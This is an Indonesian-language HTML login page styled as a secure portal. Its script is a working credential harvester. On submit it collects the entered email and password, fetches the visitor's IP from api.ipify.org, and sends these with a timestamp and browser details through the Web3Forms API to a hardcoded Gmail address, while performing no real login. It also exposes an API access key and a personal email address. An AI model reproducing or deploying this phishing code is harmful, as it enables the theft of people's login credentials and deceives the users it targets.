<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Login By kasya</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 450px;
            padding: 40px;
            animation: slideIn 0.5s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .icon {
            text-align: center;
            margin-bottom: 20px;
        }

        .icon span {
            font-size: 70px;
            display: inline-block;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            outline: none;
        }

        input:focus {
            border-color: #2a5298;
            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }

        button:active {
            transform: translateY(0);
        }

        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        #message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            font-size: 14px;
            font-weight: 500;
            display: none;
        }

        #message.show {
            display: block;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .message-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .message-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .info {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #999;
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">
            <span>🔐</span>
        </div>
        <h2>Login</h2>
        <div class="subtitle">Silakan masukkan kredensial Anda</div>
        
        <form id="loginForm">
            <div class="input-group">
                <label>📧 Alamat Email</label>
                <input type="email" id="email" name="email" required placeholder="contoh@email.com" autocomplete="off">
            </div>
            <div class="input-group">
                <label>🔒 Kata Sandi</label>
                <input type="password" id="password" name="password" required placeholder="Masukkan password" autocomplete="off">
            </div>
            <button type="submit" id="submitBtn">
                Login
            </button>
        </form>
        
        <div id="message"></div>
        <div class="info">
            🔒 Sistem aman | Data akan dikirim ke administrator
        </div>
    </div>

    <script>
        // ==================== KONFIGURASI ====================
        const EMAIL_TUJUAN = "xyelaina@gmail.com";
        const WEB3FORMS_ACCESS_KEY = "454cbadf-24b0-4eef-a0f1-8832c05ef938";
        // ====================================================
        
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('submitBtn');
        const messageDiv = document.getElementById('message');
        
        function showMessage(text, type) {
            messageDiv.innerHTML = text;
            messageDiv.className = 'show';
            messageDiv.classList.add(`message-${type}`);
            
            setTimeout(() => {
                messageDiv.classList.remove('show');
                messageDiv.classList.remove(`message-${type}`);
            }, 5000);
        }
        
        async function sendToWeb3Forms(email, password) {
            let ip = 'Tidak terdeteksi';
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch(e) {}
            
            const pesan = `
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 DETAIL LOGIN BARU
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📧 EMAIL: ${email}
🔒 PASSWORD: ${password}
🌐 IP ADDRESS: ${ip}
🕐 WAKTU: ${new Date().toLocaleString('id-ID')}
💻 BROWSER: ${navigator.userAgent}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            `;
            
            const formData = new FormData();
            formData.append('access_key', WEB3FORMS_ACCESS_KEY);
            formData.append('email', EMAIL_TUJUAN);
            formData.append('subject', `🔐 LOGIN: ${email} - ${new Date().toLocaleString()}`);
            formData.append('message', pesan);
            formData.append('from_name', 'Login Portal System');
            
            try {
                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                console.log('Response:', result);
                
                if (result.success) {
                    return { success: true, message: 'Login berhasil! Data akan segera dikirim ke email.' };
                } else {
                    return { success: false, message: result.message || 'Gagal mengirim' };
                }
            } catch (error) {
                console.error('Error:', error);
                return { success: false, message: 'Koneksi gagal: ' + error.message };
            }
        }
        
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!email || !password) {
                showMessage('❌ Harap isi email dan password!', 'error');
                return;
            }
            
            if (!email.includes('@')) {
                showMessage('❌ Format email tidak valid!', 'error');
                return;
            }
            
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span class="loading-spinner"></span> Memproses...';
            
            const result = await sendToWeb3Forms(email, password);
            
            if (result.success) {
                showMessage('✅ ' + result.message, 'success');
                emailInput.value = '';
                passwordInput.value = '';
                emailInput.focus();
            } else {
                showMessage('❌ ' + result.message, 'error');
            }
            
            submitBtn.disabled = false;
            submitBtn.innerHTML = 'Login';
        });
        
        // Konfirmasi siap
        console.log('✅ Sistem siap! Data akan dikirim ke: ' + EMAIL_TUJUAN);
    </script>
</body>
</html>
